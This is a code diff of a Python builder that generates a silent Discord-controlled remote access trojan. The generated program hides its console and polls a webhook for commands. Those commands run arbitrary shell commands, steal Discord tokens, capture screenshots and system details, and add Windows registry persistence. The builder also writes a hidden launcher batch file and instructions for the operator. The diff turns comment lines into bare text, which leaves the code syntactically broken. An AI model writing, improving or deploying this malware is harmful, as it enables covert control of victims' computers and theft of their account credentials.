@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Discord RAT Builder 
+Discord RAT Builder - Silent Background RAT
 
 import os, sys, time, base64, random, string, platform, json, subprocess, re
 
@@ -26,36 +26,28 @@ def run():
     print("\n[+] Building Silent Background Discord RAT...")
     
     code = f'''#!/usr/bin/env python3
-# Discord RAT - Silent Background - No Console
+Discord RAT - Silent Background - Fixed Command Processing
 
 import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass, tempfile
 
 WEBHOOK = "{webhook}"
 IS_WIN = platform.system() == "Windows"
 PROCESSED_COMMANDS = set()
-LAST_CHECK = 0
 FIRST_RUN = True
 
 def hide_console():
-    """Hide console window completely"""
-    if IS_WIN:
-        try:
-            # Hide the console window
+    try:
+        if IS_WIN:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-            # Also try to detach from console
             ctypes.windll.kernel32.FreeConsole()
-        except:
-            pass
-    else:
-        # Linux/Mac - fork to background
-        try:
+        else:
             if os.fork() > 0:
                 sys.exit(0)
             os.setsid()
             if os.fork() > 0:
                 sys.exit(0)
-        except:
-            pass
+    except:
+        pass
 
 def send(data):
     try:
@@ -159,7 +151,7 @@ def take_screenshot():
 
 def persist_windows():
     if not IS_WIN:
-        return
+        return "[!] Persistence only works on Windows"
     try:
         import winreg
         key = winreg.HKEY_CURRENT_USER
@@ -174,10 +166,8 @@ def persist_windows():
 def main():
     global FIRST_RUN
     
-    # Hide console immediately
     hide_console()
     
-    # Send connection notification only on first run
     if FIRST_RUN:
         FIRST_RUN = False
         try:
@@ -189,64 +179,64 @@ def main():
         except:
             pass
     
-    # Main loop - wait for commands
+    session = requests.Session()
+    session.headers.update({{'Content-Type': 'application/json'}})
+    
     while True:
         try:
-            # Check for commands
-            response = requests.get(WEBHOOK, timeout=5)
+            resp = session.get(WEBHOOK + '?limit=10', timeout=10)
             
-            if response.status_code == 200:
+            if resp.status_code == 200:
                 try:
-                    data = response.json()
-                    if isinstance(data, list) and len(data) > 0:
-                        # Process only the latest message
-                        latest = data[-1] if data else None
-                        if latest and 'content' in latest:
-                            cmd = latest['content'].strip()
-                            cmd_id = latest.get('id', str(time.time()))
-                            
-                            # Skip if already processed
-                            if cmd_id in PROCESSED_COMMANDS:
-                                time.sleep(2)
-                                continue
-                            
-                            # Mark as processed
-                            PROCESSED_COMMANDS.add(cmd_id)
-                            
-                            # Process command
-                            if cmd.startswith('shell '):
-                                result = execute_cmd(cmd[6:])
-                                send(result)
+                    messages = resp.json()
+                    if isinstance(messages, list) and len(messages) > 0:
+                        for msg in reversed(messages):
+                            if 'content' in msg and msg['content']:
+                                cmd = msg['content'].strip()
+                                msg_id = msg.get('id', str(time.time()))
                                 
-                            elif cmd == 'tokens':
-                                tokens = steal_tokens()
-                                if tokens:
-                                    send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens[:10]))
-                                else:
-                                    send("[!] No tokens found")
-                                    
-                            elif cmd == 'sysinfo' or cmd == 'pc_info':
-                                info = get_pc_info()
-                                send(info)
+                                if not cmd or msg_id in PROCESSED_COMMANDS:
+                                    continue
                                 
-                            elif cmd == 'screenshot':
-                                img = take_screenshot()
-                                if img and img != "[!] Screenshot failed":
-                                    send("[+] Screenshot captured\\n" + img[:500] + "...")
-                                else:
-                                    send("[!] Screenshot failed")
-                                    
-                            elif cmd == 'persist':
-                                result = persist_windows()
-                                send(result)
-                                    
-                            elif cmd == 'connected':
-                                send("[+] RAT is connected and running")
-                                pc_info = get_pc_info()
-                                send(pc_info)
+                                if msg.get('author', {{}}).get('bot', False):
+                                    continue
                                 
-                            elif cmd == 'help':
-                                help_text = """=== DISCORD RAT COMMANDS ===
+                                PROCESSED_COMMANDS.add(msg_id)
+                                
+                                if cmd.startswith('shell '):
+                                    result = execute_cmd(cmd[6:])
+                                    send(result)
+                                    time.sleep(1)
+                                    
+                                elif cmd == 'tokens':
+                                    tokens = steal_tokens()
+                                    if tokens:
+                                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens[:10]))
+                                    else:
+                                        send("[!] No tokens found")
+                                        
+                                elif cmd == 'sysinfo' or cmd == 'pc_info':
+                                    info = get_pc_info()
+                                    send(info)
+                                    
+                                elif cmd == 'screenshot':
+                                    img = take_screenshot()
+                                    if img and img != "[!] Screenshot failed":
+                                        send("[+] Screenshot captured\\n" + img[:500] + "...")
+                                    else:
+                                        send("[!] Screenshot failed")
+                                        
+                                elif cmd == 'persist':
+                                    result = persist_windows()
+                                    send(result)
+                                        
+                                elif cmd == 'connected':
+                                    send("[+] RAT is connected and running")
+                                    pc_info = get_pc_info()
+                                    send(pc_info)
+                                    
+                                elif cmd == 'help':
+                                    help_text = """=== DISCORD RAT COMMANDS ===
 shell [cmd]  - Execute system command
 tokens       - Steal Discord tokens
 sysinfo      - Get system information
@@ -256,23 +246,27 @@ persist      - Enable persistence
 connected    - Check if RAT is connected
 help         - Show this help
 exit         - Stop the RAT"""
-                                send(help_text)
-                                
-                            elif cmd == 'exit':
-                                send("[!] RAT shutting down...")
-                                sys.exit(0)
-                                
-                            else:
-                                # Only send unknown command if it's not empty
-                                if cmd and len(cmd) > 0 and not cmd.startswith('['):
+                                    send(help_text)
+                                    
+                                elif cmd == 'exit':
+                                    send("[!] RAT shutting down...")
+                                    sys.exit(0)
+                                    
+                                elif cmd.startswith('[') or cmd.startswith('+'):
+                                    continue
+                                    
+                                else:
                                     send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
+                                    
                 except json.JSONDecodeError:
                     pass
                 except Exception as e:
                     pass
             
-            time.sleep(3)  # Wait 3 seconds before checking again
+            time.sleep(3)
             
+        except requests.RequestException:
+            time.sleep(5)
         except Exception as e:
             time.sleep(5)
 
@@ -280,8 +274,7 @@ if __name__ == "__main__":
     main()
 '''
     
-    # Save the RAT
-    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
+    out_dir = os.path.expanduser("~/Downloads/DiscordRAT_Output")
     os.makedirs(out_dir, exist_ok=True)
     
     py_path = os.path.join(out_dir, filename + ".py")
@@ -290,7 +283,6 @@ if __name__ == "__main__":
     
     print(f"\n[+] RAT saved to: {py_path}")
     
-    # Create a BAT file for easy execution (hidden)
     bat_path = os.path.join(out_dir, filename + ".bat")
     with open(bat_path, 'w') as f:
         f.write(f'''@echo off
@@ -309,7 +301,7 @@ exit
     print("\n2. The RAT runs silently in the background")
     print("3. Send commands via webhook:")
     print("   - Go to your Discord webhook URL")
-    print("   - Type a command and send it")
+    print("   - Type a command and send it as a message")
     print("\n4. Available commands:")
     print("   shell [cmd]  - Execute system command")
     print("   tokens       - Steal Discord tokens")
